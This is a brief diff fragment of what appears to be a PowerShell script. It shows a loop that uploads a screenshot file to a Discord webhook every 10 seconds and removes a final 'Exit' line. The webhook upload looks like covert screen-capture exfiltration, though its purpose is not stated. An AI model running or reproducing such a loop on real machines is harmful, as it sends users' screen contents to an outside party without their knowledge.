@@ -84,4 +84,3 @@ Send-DiscordWebhook -webhookUrl $WebhookUrl -filePath $screenshot
      Send-DiscordWebhook -webhookUrl $WebhookUrl -filePath $screenshot
      Start-Sleep -Seconds 10
 }
-Exit
